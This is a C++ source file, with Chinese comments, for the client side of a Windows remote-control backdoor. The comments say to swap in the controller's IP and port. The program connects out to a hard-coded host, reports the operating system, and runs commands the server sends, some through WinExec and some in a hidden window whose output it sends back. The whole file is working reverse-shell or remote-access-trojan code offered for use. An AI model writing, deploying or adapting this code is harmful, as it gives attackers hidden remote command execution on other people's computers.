//斯 本来远控端是打算C++写的 但还是菜 后面改C#了 这个只能执行cmd命名
//替换180行和181行的IP和端口号即可

#pragma comment(lib, "ws2_32.lib")  //加载 ws2_32.dll

#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <assert.h>

#pragma warning(disable : 4996)

struct threadnode{char Msg[4096];  SOCKET socks;};

using namespace std;

string GetSystemName()
{
    SYSTEM_INFO info;        //用SYSTEM_INFO结构判断64位AMD处理器   
    GetSystemInfo(&info);    //调用GetSystemInfo函数填充结构   
    OSVERSIONINFOEX os;
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    std::string osname = "unknown OperatingSystem.";

    if (GetVersionEx((OSVERSIONINFO *)&os))
    {
        //下面根据版本信息判断操作系统名称   
        switch (os.dwMajorVersion)//判断主版本号  
        {
        case 5:
            switch (os.dwMinorVersion)   //再比较dwMinorVersion的值  
            {
            case 0:
                osname = "Microsoft Windows 2000";//1999年12月发布  
                break;

            case 1:
                osname = "Microsoft Windows XP";//2001年8月发布  
                break;

            case 2:
                if (os.wProductType == VER_NT_WORKSTATION
                    && info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                {
                    osname = "Microsoft Windows XP Professional x64 Edition";
                }
                else if (GetSystemMetrics(SM_SERVERR2) == 0)
                    osname = "Microsoft Windows Server 2003";//2003年3月发布   
                else if (GetSystemMetrics(SM_SERVERR2) != 0)
                    osname = "Microsoft Windows Server 2003 R2";
                break;
            }
            break;

        case 6:
            switch (os.dwMinorVersion)
            {
            case 0:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows Vista";
                else
                    osname = "Microsoft Windows Server 2008";//服务器版本   
                break;
            case 1:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Microsoft Windows 7";
                else
                    osname = "Microsoft Windows Server 2008 R2";
                break;
            case 2:
                if (os.wProductType == VER_NT_WORKSTATION)
                    osname = "Windows 8 / 8.1 / 10";
                else
                    osname = "Windows Server 2012 / 2016 / 2019";
                break;
            }
            break;
        }
    }

    return osname;
}

DWORD WINAPI anaylsecomm(LPVOID lpargs){
	threadnode *p = (threadnode *)lpargs;
	
	char command[4096] = {0};
	for(int i=0;i<4096;i++){
		command[i] = p->Msg[i];
	}
	SOCKET socks; socks = p->socks;
	
	printf("%s\n",command);
	
	char comexecu[4096]; 
	memset(comexecu,0,sizeof(comexecu));
	
	if(command[0] == 'B'){
		char back[1] = {'B'};
		send(socks, back, strlen(back) + sizeof(char), NULL);
	}
	
	if(command[0] == 'a'){
		for(int i=1;i<4096;i++){
			comexecu[i-1] = command[i];
		}
		
		WinExec(comexecu,SW_SHOWNORMAL);
	}
	
	if(command[0] == 'c'){
		for(int i=1;i<4096;i++){
			comexecu[i-1] = command[i];
		}
		
		SECURITY_ATTRIBUTES sa;  
    	HANDLE hRead,hWrite;  
  
    	sa.nLength = sizeof(SECURITY_ATTRIBUTES);  
    	sa.lpSecurityDescriptor = NULL;  
    	sa.bInheritHandle = TRUE;  
  
    	if(!CreatePipe(&hRead,&hWrite,&sa,0))  
    	{  
        	return 0;  
    	}  
    	
    	STARTUPINFO si;  
    	PROCESS_INFORMATION pi;  
  
    	ZeroMemory(&si,sizeof(STARTUPINFO));  
    	si.cb = sizeof(STARTUPINFO);  
    	GetStartupInfo(&si);  
    	si.hStdError = hWrite;  
    	si.hStdOutput = hWrite;  
    	si.wShowWindow = SW_HIDE;  
    	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;  
		
		if(!CreateProcess(NULL,comexecu,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))  
    	{  
        	return 0;  
    	}  
    	CloseHandle(hWrite);  
    	
    	char buffer[4096] = {0}; DWORD bytesRead;  
    	while(1)  
    	{  
        	if(NULL == ReadFile(hRead,buffer,4095,&bytesRead,NULL))  
        	{  
           		break;  
        	}  
        	Sleep(2000);  
    	}  
    	CloseHandle(hRead);  
		
		printf("%s",buffer);
		
		send(socks, buffer, strlen(buffer) + sizeof(char), NULL);
	}

}

DWORD WINAPI MainListenServer(LPVOID lp){
	std::string strOSversion = GetSystemName();
	
	char ch[50]; char endeof[5] = {'<','E','O','F','>'};
	strcpy(ch,strOSversion.c_str());
	//初始化DLL
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    //创建套接字
    SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    //向服务器发起请求
    sockaddr_in sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));  
    sockAddr.sin_family = PF_INET;
    sockAddr.sin_addr.s_addr = inet_addr("192.168.239.136");
    sockAddr.sin_port = htons(8080);
    
    connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
    //发送操作系统信息 
    send(sock, ch, strlen(ch) + sizeof(char), NULL);
    send(sock, endeof,strlen(endeof) + sizeof(char) ,NULL);
    
    int failtime = 0 ;
    
    char serverMsg[MAXBYTE] = {0};
    
    threadnode N;
    N.socks = sock; 
    while(true){
    	recv(sock, serverMsg, MAXBYTE, NULL);
    	printf("获取到服务器指令%s\n",serverMsg); 
    	
    	for(int i=0;i<4096;i++){
    		N.Msg[i] = serverMsg[i];
		}
    	
    	CreateThread(NULL,0,anaylsecomm,&N,0,NULL);
    	memset(serverMsg,0,sizeof(serverMsg));
    	
    	failtime++;
    	if(failtime >=100) break;
	} 
}

int main(){
	CreateThread(NULL, 0, MainListenServer, 0, 0, NULL);
	
    system("pause");
    return 0;
}
